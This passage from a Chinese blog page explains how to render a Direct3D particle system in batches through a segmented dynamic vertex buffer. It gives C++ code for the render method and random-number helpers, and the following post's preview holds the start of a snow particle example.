itemprop="name headline"><a href=/post/d3d-particle-system-3/ itemprop=url class=post-title-link>D3D中的粒子系统（3）</a></h2><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2008年04月04日 20:07:00 CST" itemprop="dateCreated datePublished" datetime="2008-04-04 20:07:00 +0800 +0800">2008年04月04日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/gamedev/ itemprop=url rel=index><span itemprop=name>dev/GameDev</span>
</a></span></span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=pageview-count data-path=/post/d3d-particle-system-3/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><p>14.2.1 绘制粒子系统<p>因为粒子系统是动态的，在每一个帧中我们需要更新系统中的粒子，对于渲染粒子系统的一种直观但效率低下的方法如下:<p>创建一个足够大的顶点缓存保存最大数量的粒子。<p>每一帧里执行：<p>A.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更新所有粒子。<p>B.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; COPY所有活着的粒子到顶点缓存。<p>C.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 绘制顶点缓存。<p>这个方法正确，不过不是最有效率的。第一，顶点缓冲必须足够大以保存系统中所有粒子。但是非常重要的是，当我们从列表拷贝所有粒子到顶点缓冲（步骤B）时，显卡却什么也不做。举个例子，假设我们系统有10,000个粒子，首先我们需要一个能容纳10,000个粒子的顶点缓冲，这是一个很大的内存。另外显卡将停着什么也不做直到列表中的10,000个粒子拷到顶点缓冲，直到我们调用DrawPrimitive。这个特定情况是CPU与显卡不同时工作的一个很好的例子。<p>更好的办法（SDK中点精灵例程中用到的方法）就象这样：<p>提示：这是一个简单的描述，但它说明了这一思想。它假定我们总是有500个粒子以填充一个缓存片段，但是这是不可能发生的，因为我们经常杀死并创建粒子，所以从一帧到另一帧粒子数量是变化的。举个例子，假设我们只剩下200个粒子要在当前帧拷贝并渲染。因为200个粒子不能填充整个缓存片段，我们用代码处理这个特定情形。这个特定情形只有在最后的缓存片段中才会出现，因为如果不是最后的片断，就意味着必然有500个粒子将被移到下一缓存片段。<p>创建一个合适尺寸的顶点缓存（能够保存2000个粒子），然后我们划分顶点缓存为几个小的块，就像这个例子，我们设置每个缓存片断的尺寸为500个粒子。<p>l然后创建一个全局变量 i = 0 ，用来记录片段。<p>每一帧里执行:<p>A.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更新所有粒子。<p>B.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 直到所有粒子渲染完毕。<p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果顶点缓存没有满：<p>a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 用D3DLOCK_NOOVERWRITE标记锁定缓存片段i<p>b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; COPY 500个粒子到片段i<p>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果顶点缓存满了：<p>a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 从起始的地方开始顶点缓冲: i=0<p>b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 用D3DLOCK_NOOVERWRITE标记锁定缓存段i<p>c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; COPY 500个粒子到片段i<p>3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 渲染片段i.<p>4.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 下一片段： i+ +<p>备注：顶点缓存是动态的， 因此我们能利用动态锁定标记D3DLOCK_NOOVERWRITE和 D3DLOCK_DISCARD。这两个标记允许我们锁定顶点缓存的某一部分。当顶点缓存中的其他部分被渲染时，它是不能渲染的。例如，假如我们正在使用D3DLOCK_NOOVERWRITE标记渲染片段0时， 当渲染片段0的时候我们能锁定并填充片段1。这样可以防止渲染的延迟。<p>这个方法更有效率。首先，我们减少顶点缓存的尺寸；然后， CPU与显卡在协调的工作。也就是说，当我们绘制一小批粒子时(graphics card work)，同时拷贝另一小批粒子到顶点缓存 (CPU work)。这个动作是连续执行的，直到所有的粒子都被渲染完毕，就像你了解的一样， 显卡在全部顶点缓存被填充的时候是不用处于空闲状态的。<p>我们现在将注意力转向这一个渲染方案的实现，为了方便使用这个粒子系统的渲染方案, 我们使用 cParticleSystem 类中的下列数据成员:<p>m_vb_num—在给定时间内我们的顶点缓存能够保存的粒子数量。这个值与实际的粒子系统中的粒子数无关。<p>m_vb_offset—这个变量是顶点缓存中的偏移，在顶点缓存里我们将用它开始COPY下一批粒子，例如，如果第一批在缓存中是0到499，偏移到第二批COPY的开始处将是500。<p>m_vb_batch_size—定义一批缓存中的粒子数量。<p>我们现在介绍渲染方法的代码：<br>&nbsp;&nbsp;&nbsp; void cParticleSystem::render()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // The render method works by filling a section of the vertex buffer with data, then we render that section.&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // While that section is rendering we lock a new section and begin to fill that section.&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Once that sections filled we render it. This process continues until all the particles have been drawn.&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // The benifit of this method is that we keep the video card and the CPU busy.&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(m_particles.empty())<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // set render states<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pre_render();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetTexture(0, m_texture);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetFVF(PARTICLE_FVF);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetStreamSource(0, m_vertex_buffer, 0, sizeof(sParticle));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // render batches one by one<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // start at beginning if we're at the end of the vertex buffer<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(m_vb_offset >= m_vb_num)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sParticle* v;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vertex_buffer->Lock(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset * sizeof(sParticle),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_batch_num * sizeof(sParticle),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (void**)&amp;v,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset ? D3DLOCK_NOOVERWRITE : D3DLOCK_DISCARD);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DWORD num_particles_in_batch = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // until all particles have been rendered<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(list&lt;sParticleAttribute>::iterator iter = m_particles.begin(); iter != m_particles.end(); iter++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(! iter->is_alive)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // copy a batch of the living particles to the next vertex buffer segment<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v->position = iter->position;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v->color&nbsp;&nbsp;&nbsp; = (D3DCOLOR) iter->color;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v++;&nbsp;&nbsp;&nbsp; // next element<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; num_particles_in_batch++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // if this batch full?<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(num_particles_in_batch == m_vb_batch_num)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // draw the last batch of particles that was copied to the vertex buffer<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vertex_buffer->Unlock();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->DrawPrimitive(D3DPT_POINTLIST, m_vb_offset, m_vb_batch_num);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // While that batch is drawing, start filling the next batch with particles.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // move the offset to the start of the next batch<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset += m_vb_batch_num;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Don't offset into memory that is outside the vb's range.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // If we're at the end, start at the beginning.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(m_vb_offset >= m_vb_num)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vertex_buffer->Lock(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset * sizeof(sParticle),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_batch_num * sizeof(sParticle),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (void**)&amp;v,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset ? D3DLOCK_NOOVERWRITE : D3DLOCK_DISCARD);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; num_particles_in_batch = 0;&nbsp;&nbsp;&nbsp; // reset for new batch<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vertex_buffer->Unlock();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Its possible that the LAST batch being filled never got rendered because the condition<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // (num_particles_in_batch == m_vb_batch_num) would not have been satisfied.&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // We draw the last partially filled batch now.&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(num_particles_in_batch)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->DrawPrimitive(D3DPT_POINTLIST, m_vb_offset, num_particles_in_batch);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset += m_vb_batch_num;&nbsp;&nbsp;&nbsp; // next block<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; post_render();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // reset render states<br>&nbsp;&nbsp;&nbsp; }<br>14.2.2 随机<p>如果我们模拟雪花，不能让所有雪花以完全相同的方式落下。我们要让它们按相似的方式落下而不是完全相同的方式。为了使粒子系统的随机功能更简单，我们增加了下列两个函数到d3dUtility.h/cpp文件。<p>第一个函数在[low_bound, high_bound]区间内随机的返回一个float类型值：<br>&nbsp;&nbsp;&nbsp; float get_random_float(float low_bound, float high_bound)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(low_bound >= high_bound)&nbsp;&nbsp;&nbsp; // bad input<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return low_bound;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // get random float in [0, 1] interval<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; float f = (rand() % 10000) * 0.0001f;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // return float in [low_bound, high_bound] interval<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return f * (high_bound - low_bound) + low_bound;<br>&nbsp;&nbsp;&nbsp; }<p>第二个函数在边界盒的范围内，输出一个随机的向量。<br>&nbsp;&nbsp;&nbsp; void get_random_vector(D3DXVECTOR3* out, D3DXVECTOR3* min, D3DXVECTOR3* max)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out->x = get_random_float(min->x, max->x);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out->y = get_random_float(min->y, max->y);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out->z = get_random_float(min->z, max->z);<br>&nbsp;&nbsp;&nbsp; }</p></div><footer class=post-footer><div class=post-button><a class=btn href=/post/d3d-particle-system-3/#more rel=contents>阅读全文 &#187;</a></div><div class=post-eof></div></footer></article></div><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blogs.qipai360.cn/post/d3d-particle-system-4/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Rise"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Rise"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="D3D中的粒子系统（4）"><meta itemprop=description content='14.3具体的粒子系统：雪、火、粒子枪  现在让我们用cParticleSystem类开始一个具体的粒子系统，为了说明用意，这些系统的设计很简单，没有用到cParticleSystem类所提供的所有灵活性。我们实现雪、火、粒子枪系统。雪系统模拟下落的雪花，火系统模拟看上去像火焰的爆炸，粒子枪系统从照相机位置向对面发射出粒子（用键盘）。14.3.1 例子程序：雪  雪系统类定义如下：&nbsp;&nbsp;&nbsp; class cSnow : public cParticleSystem&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp; public:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cSnow(cBoundingBox* bounding_box, int num_particles);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void reset_particle(sParticleAttribute* attr);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void update(float time_delta);&nbsp;&nbsp;&nbsp; };  构造函数提供一个点给边界盒结构，边界盒是粒子系统的成员。边界盒描述雪花在哪个范围内（体积范围）下落，如果雪花出了边界盒，它将被杀死并再生。这样，雪系统始终能保存有同样数量的激粒子，构造函数的实现：&nbsp;&nbsp;&nbsp; cSnow::cSnow(cBoundingBox* bounding_box, int num_particles)&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_bounding_box&nbsp;&nbsp;&nbsp; = *bounding_box;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = 0.25f;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_num&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = 2048;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_batch_num&nbsp;&nbsp;&nbsp; = 512;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int i = 0; i < num_particles; i++)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add_particle();&nbsp;&nbsp;&nbsp; }  同样注意：我们指定顶点缓存的尺寸，每一批的尺寸和开始的偏移。  reset_particle方法创建一个雪花，在x、z轴随机的位置并在边界盒的范围内。设置y轴高度为边界盒的顶部。我们给雪花一个速度，以便让雪花下落时稍稍向左倾斜。雪花是白色的。&nbsp;&nbsp;&nbsp; void cSnow::reset_particle(sParticleAttribute* attr)&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; attr->is_alive = true;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // get random x, z coordinate for the position of the snow flake&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; get_random_vector(&amp;attr->position, &amp;m_bounding_box.m_min, &amp;m_bounding_box.m_max);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no randomness for height (y-coordinate).&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Snow flake always starts at the top of bounding box.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; attr->position.y = m_bounding_box.m_max.y;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // snow flakes fall downwards and slightly to the left&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; attr->velocity.x = get_random_float(0.0f, 1.0f) * (-3.0f);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; attr->velocity.y = get_random_float(0.0f, 1.0f) * (-10.0f);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; attr->velocity.z = 0.0f;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // white snow flake&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; attr->color = WHITE;&nbsp;&nbsp;&nbsp; }  update方法更新粒子和粒子间的位置，并且测试粒子是否在系统的边界盒之外，如果它已经跳出边界盒，就再重新创建。 &nbsp;&nbsp;&nbsp; void cSnow::update(float time_delta)&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(list<sParticleAttribute>::iterator iter = m_particles.begin(); iter != m_particles.end(); iter++)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iter->position += iter->velocity * time_delta;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // is the point outside bounds?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(! m_bounding_box.is_point_inside(iter->position))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // recycle dead particles, so respawn it.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reset_particle(&(*iter));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; }  执行程序： &nbsp;&nbsp;&nbsp; #include "d3dUtility.h"&nbsp;&nbsp;&nbsp; #include "camera.h"&nbsp;&nbsp;&nbsp; #include "ParticleSystem.h"&nbsp;&nbsp;&nbsp; #include <cstdlib>&nbsp;&nbsp;&nbsp; #include <ctime>&nbsp;&nbsp;&nbsp; #pragma warning(disable : 4100)&nbsp;&nbsp;&nbsp; const int WIDTH&nbsp; = 640;&nbsp;&nbsp;&nbsp; const int HEIGHT = 480;&nbsp;&nbsp;&nbsp; IDirect3DDevice9*&nbsp;&nbsp;&nbsp; g_device;&nbsp;&nbsp;&nbsp; cParticleSystem*&nbsp;&nbsp;&nbsp; g_snow;&nbsp;&nbsp;&nbsp; cCamera&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera(AIR_CRAFT);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ////////////////////////////////////////////////////////////////////////////////////////////////////&nbsp;&nbsp;&nbsp; bool setup()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; srand((unsigned int)time(NULL));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // create snow system&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cBoundingBox bounding_box;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bounding_box.m_min = D3DXVECTOR3(-10.0f, -10.0f, -10.0f);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bounding_box.m_max = D3DXVECTOR3(10.0f, 10.0f, 10.0f);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_snow = new cSnow(&amp;bounding_box, 5000);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_snow->init(g_device, "snowflake.dds");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // setup a basic scnen, the scene will be created the first time this function is called.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; draw_basic_scene(g_device, 1.0f);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // set the projection matrix&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DXMATRIX proj;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DXMatrixPerspectiveFovLH(&amp;proj, D3DX_PI/4.0f, (float)WIDTH/HEIGHT, 1.0f, 1000.0f);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->SetTransform(D3DTS_PROJECTION, &amp;proj);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///////////////////////////////////////////////////////////////////////////////////////////////////////&nbsp;&nbsp;&nbsp; void cleanup()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; delete g_snow;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // pass NULL for the first parameter to instruct cleanup&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; draw_basic_scene(NULL, 0.0f);&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///////////////////////////////////////////////////////////////////////////////////////////////////////&nbsp;&nbsp;&nbsp; bool display(float time_delta)&nbsp;&nbsp;&nbsp; 